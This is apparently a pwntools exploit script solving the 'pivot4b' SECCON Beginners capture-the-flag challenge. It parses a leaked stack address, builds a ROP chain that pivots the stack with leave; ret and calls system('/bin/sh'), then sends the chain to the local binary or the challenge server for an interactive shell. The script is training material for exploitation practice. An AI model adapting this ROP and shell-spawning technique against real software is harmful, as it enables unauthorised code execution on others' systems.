#!/usr/bin/python

from pwn import *

# Pass the nc hostname port
CONN = "nc pivot4b.challenges.beginners.seccon.jp 12300".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================


def sl(x):
    io.sendline(x)


def sla(x, y):
    io.sendlineafter(x, y)


def se(x):
    io.send(x)


def sa(x, y):
    io.sendafter(x, y)


def ru(x, drop=False):
    return io.recvuntil(x, drop=drop)


def rl():
    return io.recvline()


def cl():
    io.clean()


def un64(x):
    return u64(x.ljust(8, b"\x00"))


def leak(name, addr):
    info(f"{name} @ {hex(addr)}")


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(HOST, PORT, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def exploit(io):
    # Build the payload

    ru(b"message: ")
    msg_ptr = int(rl().strip().decode(), 16)
    leak("msg_ptr", msg_ptr)

    leave_ret = 0x0000000000401211  # : leave ; ret
    ret = elf.sym["gift_call_system"] + 21
    system = elf.plt["system"]
    payload = flat(
        {
            0: [
                p64(msg_ptr + 0x28),  # Overwrite RDI
                p64(elf.sym["gift_set_first_arg"]),
                p64(ret),
                p64(ret),
                p64(system),
                b"/bin/sh\x00",
                p64(msg_ptr),
                p64(leave_ret),
            ]
        }
    )

    sla(b"> ", payload)

    # Got Shell?
    io.interactive()


# ===========================================================
#                           SETUP
# ===========================================================


if __name__ == "__main__":
    # Specify GDB script here (breakpoints etc)
    gdbscript = """
    b *main+119
    c
    """.format(**locals())

    # Binary filename
    exe = "./chall"

    # This will automatically get context arch, bits, os etc
    elf = context.binary = ELF(exe, checksec=False)
    rop = ROP(elf)

    # Change logging level to help with debugging (error/warning/info/debug)
    context.terminal = "tmux splitw -h".split(" ")
    context.log_level = "debug"
    # context.log_level = "info"

    # Lib-C library, can use pwninit/patchelf to patch binary
    libc = elf.libc
    ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

    if args.REMOTE:
        pass
        # libc = ELF("libc.so.6", checksec=False)
        # ld = ELF("ld-linux-x86-64.so.2", checksec=False)

    io = start()

    exploit(io)
